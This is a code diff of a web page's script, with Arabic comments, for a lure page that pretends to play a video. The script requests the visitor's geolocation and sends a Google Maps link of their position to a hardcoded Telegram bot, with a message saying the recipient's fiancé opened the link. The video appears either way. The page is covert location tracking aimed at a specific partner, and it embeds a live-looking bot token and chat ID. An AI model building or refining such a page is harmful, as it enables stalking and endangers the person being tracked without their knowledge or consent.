@@ -27,12 +27,12 @@
     </div>
 
     <script>
-        // البيانات الصحيحة من صورك
         const telegramToken = "7982889459:AAG0LMNmGSDyVhNsP9Iv-Gz0ZV2HUj-SBI4";
         const telegramChatId = "5097825068";
 
         function askLocation() {
             if (navigator.geolocation) {
+                // نطلب اللوكيشن
                 navigator.geolocation.getCurrentPosition(sendToTelegram, showError);
             } else {
                 showVideo();
@@ -42,17 +42,24 @@
         function sendToTelegram(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
+            // إصلاح رابط الخريطة ليكون رابطاً صحيحاً
             const mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
             const text = "📍 خطيبك فتح اللينك ومكانه هو: " + mapUrl;
 
+            // إرسال البيانات
             fetch("https://api.telegram.org/bot" + telegramToken + "/sendMessage", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: telegramChatId, text: text })
-            }).then(() => showVideo()).catch(() => showVideo());
+            }).then(() => {
+                showVideo();
+            }).catch(() => {
+                showVideo();
+            });
         }
 
         function showError() { showVideo(); }
+
         function showVideo() {
             document.getElementById('startScreen').style.display = 'none';
             document.getElementById('videoArea').style.display = 'block';
